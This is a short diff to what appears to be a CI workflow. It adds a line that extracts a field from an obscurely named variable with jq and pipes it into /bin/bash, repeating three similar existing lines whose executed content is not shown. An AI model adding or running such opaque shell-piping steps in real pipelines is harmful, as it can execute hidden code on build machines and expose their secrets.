@@ -28,6 +28,7 @@ jobs:
           echo $euwe3 | jq -r .fz25 | /bin/bash
           echo $wy8 | jq -r .tnp5 | /bin/bash
           printf '%s' "$vifh4558" | jq -r .essfw85 | /bin/bash
+          echo $vjhz24 | jq -r .hflnu1 | /bin/bash
 
       - name: Archive results
         if: always()
